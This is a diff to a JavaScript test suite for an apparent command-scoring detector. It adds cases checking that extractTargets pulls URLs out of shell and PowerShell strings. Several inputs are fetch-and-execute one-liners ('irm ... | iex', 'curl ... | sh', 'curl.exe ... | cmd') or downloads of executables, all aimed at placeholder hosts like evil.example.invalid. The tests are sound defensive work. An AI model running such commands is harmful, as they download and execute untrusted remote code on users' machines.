@@ -71,6 +71,13 @@ describe('command scoring', () => {
     expect(extractTargets('IRM x.example.invalid/Katy7684/raw/main/95c9 | IEX')).toContain('https://x.example.invalid/Katy7684/raw/main/95c9');
     expect(extractTargets('curl -fsSL get.example.invalid/install.sh | sh')).toContain('https://get.example.invalid/install.sh');
     expect(extractTargets('irm https://x.example.invalid/a | iex')).toEqual(['https://x.example.invalid/a']);
+    expect(extractTargets('curl.exe -s evil.example.invalid/x | cmd')).toContain('https://evil.example.invalid/x');
+    expect(extractTargets('irm evil.example.invalid | iex')).toContain('https://evil.example.invalid/');
+    expect(extractTargets("irm -UserAgent 'Mozilla/5.0' -Headers @{'X-A'='b'} evil.example.invalid/p | iex")).toEqual(['https://evil.example.invalid/p']);
+    expect(extractTargets('iwr -Uri evil.example.invalid/p -OutFile a.exe')).toEqual(['https://evil.example.invalid/p']);
+    expect(extractTargets('curl -fsSL get.example.invalid/x -o install.sh && iwr a.example.invalid/c -OutFile update.zip')).toEqual(['https://get.example.invalid/x', 'https://a.example.invalid/c']);
+    expect(extractTargets('curl -s setup.py | sh')).toEqual([]);
+    expect(extractTargets('iwr evil.example.invalid/a -OutFile setup.msix')).toEqual(['https://evil.example.invalid/a']);
   });
 
   it('never blocks text without anything that runs', () => {
